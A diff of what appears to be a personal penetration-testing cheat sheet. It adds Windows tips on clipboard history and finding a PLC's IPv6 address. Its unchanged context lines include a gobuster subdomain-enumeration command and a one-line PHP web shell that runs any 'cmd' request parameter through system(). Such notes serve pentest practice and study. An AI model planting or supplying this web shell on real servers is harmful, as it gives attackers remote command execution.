@@ -61,6 +61,12 @@ gobuster dns -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; 
 $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 
+CLIPBOARD HISTORY ON WINDOWS
+Windows key + V
+
+GET A PLC IPv6 QUICKLY
+Go in Windows explorer -> Network -> Enable discovery, check the device, properties, and it has everything there.
+
 OR in grep: grep 'false\|nologin'
 to count lines: wc -l <filename>
 GREP 4 lines before match:
